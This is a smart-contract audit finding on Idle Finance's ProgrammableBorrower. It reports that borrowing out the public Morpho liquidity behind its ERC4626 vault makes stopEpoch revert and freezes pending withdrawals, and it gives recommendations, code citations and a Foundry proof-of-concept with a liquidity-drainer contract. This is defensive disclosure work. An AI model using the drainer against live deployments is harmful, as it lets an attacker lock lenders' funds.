### Title
Public liquidity consumption of the programmable borrower’s ERC4626 vault can indefinitely delay epoch settlement and freeze pending withdrawals - (contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` parks undeployed pool funds in an external ERC4626 vault and recalls the full stop-epoch shortfall through a single `vault.withdraw` call. If public users borrow or otherwise consume enough liquidity from the markets backing that vault, the withdrawal reverts even though the borrower’s shares remain economically sufficient. Because the revert propagates through `IdleCDOEpochVariant.stopEpoch`, the epoch remains running and pending withdrawal receipts cannot become claimable until third-party liquidity returns.

### Finding Description
During `startEpoch`, all on-hand underlying held by `ProgrammableBorrower` is deposited into the configured ERC4626 vault. The borrower-facing draw path reserves `epochPendingWithdraws`, but that reserve is only enforced against the configured borrower inside `availableToBorrow`; it does not reserve liquidity inside the external vault or its underlying markets.

At `stopEpoch`, `IdleCDOEpochVariant` calls `IProgrammableBorrower.onStopEpoch(amountRequired, requestingAll)` before pulling funds. `onStopEpoch` computes `shortfall = amountRequired - onHand`. If the borrower’s vault-share value covers the shortfall, it calls `vault.withdraw(shortfall, address(this), address(this))`; a vault-side liquidity or utilization revert is wrapped as `StopEpochVaultLiquidityUnavailable` and propagates. Consequently, `IdleCDOEpochVariant` never reaches `collectWithdrawFunds`, `_updateAccounting`, `isEpochRunning = false`, or the epoch counter progression needed by pending receipts.

The relevant sequence is:

1. During a buffer phase, a KYC-passing lender deposits and creates a normal withdrawal receipt.
2. Honest manager calls `startEpoch`; `ProgrammableBorrower.onStartEpoch` deposits the facility balance into the external vault and records `epochPendingWithdraws`.
3. While the epoch is running, an unprivileged third party uses the external vault’s underlying lending markets and consumes the available loan-token liquidity.
4. After `epochEndDate`, the honest manager calls `stopEpoch`.
5. `onStopEpoch` finds that the borrower’s shares are worth more than the stop-epoch cash requirement, so it proceeds to `vault.withdraw`.
6. The vault reverts because its allocated markets lack withdrawable liquidity.
7. `stopEpoch` reverts, leaving `isEpochRunning == true`, `epochAccountingActive == true`, `pendingWithdraws` unchanged, and `epochNumber` unsettled.
8. The withdrawal claimant’s receipt remains subject to the same-epoch gate in `claimWithdrawRequest`, so funds are frozen despite being economically backed by vault shares.

This mirrors the utilization-cap bug class: the credit vault’s withdrawal liquidity is indirectly capped by external lending-market utilization.

### Impact Explanation
This is temporary freezing of user funds. All principal and yield requested through `requestWithdraw` can remain inaccessible for as long as the configured vault cannot satisfy the requested withdrawal. The freeze can extend across repeated `stopEpoch` attempts because the failure is deliberately made retryable rather than treated as a borrower default.

The quantified exposure is the full `pendingWithdraws` amount plus any close-pool principal requested with `_interest == 1`. For example, if 10,000,000 USDC is parked in the external vault and 4,000,000 USDC of withdrawal receipts are pending, a third-party market borrow that leaves less than 4,000,000 USDC withdrawable prevents settlement of the full 4,000,000 USDC obligation. Since `onStopEpoch` attempts the entire shortfall atomically, even a one-wei liquidity shortfall reverts the entire stop rather than partially funding receipts.

The invariant violated is timely receipt redemption: a fully backed withdrawal receipt should become funded at epoch settlement, but its payout remains contingent on unrelated third-party market liquidity.

### Likelihood Explanation
Likelihood is moderate for any deployment using a yield-bearing ERC4626 vault whose underlying markets are publicly borrowable or otherwise capacity constrained. No privileged Idle role is required. The attacker only needs sufficient collateral to borrow from the relevant public lending market or another unprivileged way to reduce the ERC4626 vault’s withdrawable liquidity.

The condition is more likely during stress, exactly when withdrawal demand is highest. The protocol explicitly recognizes this path with `StopEpochVaultLiquidityUnavailable`, and the existing regression test demonstrates that a covered-but-unwithdrawable vault position causes `stopEpoch` to revert while leaving the epoch running.

### Recommendation
Maintain a withdraw-liquidity buffer outside the ERC4626 vault and cap the fraction of facility assets deployed into illiquid external strategies. In particular:

- Keep at least the greater of `epochPendingWithdraws` and a configured liquidity buffer on hand.
- Extend `onStopEpoch` to withdraw the maximum currently available amount, return partial liquidity to `IdleCDO`, and use an explicit partial-funding/loss path instead of reverting the whole epoch.
- Add a monitored maximum vault-utilization threshold and prevent additional deposits or borrower draws when available vault liquidity approaches `epochPendingWithdraws`.
- Provide an owner/manager unwind path that can progressively redeem vault shares without requiring the entire stop-epoch shortfall in one call.

### Proof of Concept
The following Foundry PoC uses the repository’s programmable-borrower fork fixture and a public-liquidity drainer. The exact market parameters should be populated from the MetaMorpho withdraw queue at the selected fork block; the security-critical point is that the drainer is an unprivileged third-party borrower, not an Idle role.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "./ProgrammableBorrowerCreditVault.t.sol";

contract VaultLiquidityDrainer {
    IMorpho public immutable morpho;
    IERC20Detailed public immutable collateral;
    IERC20Detailed public immutable loan;

    constructor(IMorpho _morpho, IERC20Detailed _collateral, IERC20Detailed _loan) {
        morpho = _morpho;
        collateral = _collateral;
        loan = _loan;
    }

    function drain(
        IMorpho.MarketParams memory market,
        uint256 collateralAssets,
        uint256 borrowAssets
    ) external {
        collateral.transferFrom(msg.sender, address(this), collateralAssets);
        collateral.approve(address(morpho), collateralAssets);

        morpho.supplyCollateral(market, collateralAssets, address(this), "");
        morpho.borrow(market, borrowAssets, 0, address(this), msg.sender);
    }
}

contract ProgrammableBorrowerExternalLiquidityPoC is TestProgrammableBorrowerCreditVault {
    function testExternalMarketLiquidityBlocksPendingWithdrawalSettlement() external {
        uint256 lpDeposit = 10_000 * oneScale;
        uint256 requestedAssets = 4_000 * oneScale;

        vm.prank(owner);
        cdoEpoch.setIsInterestMinted(true);

        // Buffer phase: LP deposits and creates a normal withdrawal request.
        idleCDO.depositAA(lpDeposit);
        uint256 sharesToWithdraw =
            requestedAssets * ONE_TRANCHE_TOKEN / cdoEpoch.virtualPrice(address(aaTranche));
        uint256 receiptBasis = cdoEpoch.requestWithdraw(sharesToWithdraw, address(aaTranche));

        assertGt(receiptBasis, 0);
        assertEq(strategy.pendingWithdraws(), receiptBasis);

        // Running programmable epoch: idle cash is parked in the external ERC4626 vault.
        _startEpochAndCheckPrices(0);
        assertGt(morphoVault.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.epochPendingWithdraws(), receiptBasis);

        // Unprivileged actor drains public loan-token liquidity from the market(s)
        // backing the MetaMorpho vault. Populate this from morphoVault.withdrawQueue(i).
        IMorpho.MarketParams memory targetMarket = _firstWithdrawQueueMarket();
        uint256 available = _morphoMarketLiquidity(targetMarket);

        // Leave just below the stop-epoch shortfall. Any deeper drain also works.
        uint256 borrowAmount = available - (receiptBasis - 1);
        uint256 collateralNeeded = _requiredCollateralFor(targetMarket, borrowAmount);

        VaultLiquidityDrainer drainer = new VaultLiquidityDrainer(
            IMorpho(MORPHO_BLUE),
            IERC20Detailed(targetMarket.collateralToken),
            IERC20Detailed(targetMarket.loanToken)
        );

        deal(targetMarket.collateralToken, address(this), collateralNeeded, true);
        IERC20Detailed(targetMarket.collateralToken).approve(address(drainer), collateralNeeded);
        drainer.drain(targetMarket, collateralNeeded, borrowAmount);

        assertLt(morphoVault.maxWithdraw(address(programmableBorrower)), receiptBasis);

        // The facility remains economically covered by vault shares.
        assertGe(
            morphoVault.convertToAssets(morphoVault.balanceOf(address(programmableBorrower))),
            receiptBasis
        );

        // Epoch settlement reverts before funding pendingWithdraws.
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        // User funds remain frozen: no epoch rollover and no claimable backing transfer.
        assertTrue(cdoEpoch.isEpochRunning());
        assertFalse(cdoEpoch.defaulted());
        assertEq(strategy.pendingWithdraws(), receiptBasis);

        vm.expectRevert(NotAllowed.selector);
        cdoEpoch.claimWithdrawRequest();
    }
}
```

A minimal non-fork reproduction already exists in the repository’s regression test: set a covered withdrawal cap below the pending amount, call `stopEpoch`, observe `StopEpochVaultLiquidityUnavailable`, and verify that `isEpochRunning`, `epochAccountingActive`, and `pendingWithdraws` remain unchanged. The PoC above makes the missing attacker step explicit by making the cap arise from public external-market borrowing rather than a mock setter. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L198-223)
```text
  /// @notice Hook called by IdleCDOEpochVariant when a new epoch starts.
  /// It deposits all on-hand assets into the vault and starts accounting.
  /// @param _pendingWithdraws pending withdraw requests amount to reserve for epoch end.
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-410)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L320-349)
```text
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L372-399)
```text
  function testProgrammableBorrowerStopEpochRevertsWhenVaultLiquidityUnavailable() external {
    MockStopEpochLiquidityVault limitedVault = new MockStopEpochLiquidityVault(USDC);
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    vm.prank(manager);
    programmableBorrower.setVault(address(limitedVault));

    idleCDO.depositAA(amount);
    cdoEpoch.requestWithdraw(aaTranche.balanceOf(address(this)) / 2, address(aaTranche));
    _startEpochAndCheckPrices(0);

    uint256 pendingWithdraws = strategy.pendingWithdraws();
    assertGt(pendingWithdraws, 1, "stop epoch should need liquidity recall");
    assertGe(limitedVault.convertToAssets(limitedVault.balanceOf(address(programmableBorrower))), pendingWithdraws);
    limitedVault.setWithdrawLimit(pendingWithdraws - 1);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.expectRevert(abi.encodeWithSelector(StopEpochVaultLiquidityUnavailable.selector));
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted(), "vault liquidity failure should not default");
    assertTrue(cdoEpoch.isEpochRunning(), "epoch should remain running after retryable failure");
    assertTrue(programmableBorrower.epochAccountingActive(), "borrower accounting should remain active");
    assertEq(strategy.pendingWithdraws(), pendingWithdraws, "withdraw requests should remain pending");
  }
```
